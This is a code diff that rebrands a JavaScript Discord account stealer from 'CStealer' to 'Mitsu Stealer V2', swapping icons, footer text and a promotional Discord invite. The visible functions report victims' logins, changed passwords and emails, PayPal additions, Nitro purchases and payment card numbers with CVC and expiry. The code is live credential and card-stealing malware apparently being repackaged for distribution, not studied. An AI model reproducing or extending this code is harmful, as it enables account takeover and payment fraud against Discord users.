@@ -10,8 +10,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'CStealer', 
-  embed_icon: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
+  embed_name: 'Mitsu Stealer V2', 
+  embed_icon: 'https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428',
   embed_color: 000000,
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
@@ -648,10 +648,10 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer | t.me/cstealerr',
+          text: 'Mitsu Stealer v2 > https://discord.gg/sFbQuysqrF',
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
+          url: 'https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428',
         },
       },
     ],
@@ -693,11 +693,11 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-        text: 'CStealer | t.me/cstealerr',
-        icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+        text: 'Mitsu Stealer v2 > https://discord.gg/sFbQuysqrF',
+        icon_url: "https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428"
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
+          url: 'https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428',
         },
       },
     ],
@@ -739,11 +739,11 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer | t.me/cstealerr',
-          icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+          text: 'Mitsu Stealer v2 > https://discord.gg/sFbQuysqrF',
+          icon_url: "https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428"
         },
          thumbnail: {
-           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
+           url: 'https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428',
         },
       },
     ],
@@ -785,11 +785,11 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer | t.me/cstealerr',
-          icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+          text: 'Mitsu Stealer v2 > https://discord.gg/sFbQuysqrF',
+          icon_url: "https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428"
         },
          thumbnail: {
-           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
+           url: 'https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428',
         },
       },
     ],
@@ -831,11 +831,11 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer | t.me/cstealerr',
-          icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+          text: 'Mitsu Stealer v2 > https://discord.gg/sFbQuysqrF',
+          icon_url: "https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428"
         },
          thumbnail: {
-           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
+           url: 'https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428',
         },
       },
     ],
@@ -879,11 +879,11 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer | t.me/cstealerr',
-          icon_url: "https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif"
+          text: 'Mitsu Stealer v2 > https://discord.gg/sFbQuysqrF',
+          icon_url: "https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428"
         },
          thumbnail: {
-           url: 'https://media.discordapp.net/attachments/995491577067745390/997696264235913248/GIF-210621_214354.gif',
+           url: 'https://media.discordapp.net/attachments/999980209187078224/1000412477806362714/Screenshot_2022-07-23_174138.png?width=526&height=428',
         },
       },
     ],
